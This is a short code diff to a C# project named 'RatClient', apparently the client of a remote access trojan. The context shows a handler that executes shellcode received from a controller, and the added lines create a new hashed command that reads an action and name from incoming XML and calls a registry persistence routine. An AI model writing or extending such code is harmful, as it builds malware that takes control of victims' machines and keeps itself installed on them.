@@ -14,6 +14,7 @@ namespace RatClient
         {
             xmlDoc = new XmlDocument();
         }
+
         public byte[] Run(string data)
         {
             xmlDoc.LoadXml(data);
@@ -49,6 +50,16 @@ namespace RatClient
                 if (Tools.RunShellCode(shellcode))
                 {
                     return new byte[1] { 48 };
+                }
+                return new byte[1] { 49 };
+            }
+            else if (command == "e5fcfe07178a109ea0c1e9bd7e9dd772")
+            {
+                string action = xmlDoc.SelectSingleNode("/root/action").InnerText;
+                string name = xmlDoc.SelectSingleNode("/root/name").InnerText;
+                if (Info.PersistActionsReg[action](name))
+                {
+                    return new byte[1] { 48 } ;
                 }
                 return new byte[1] { 49 };
             }
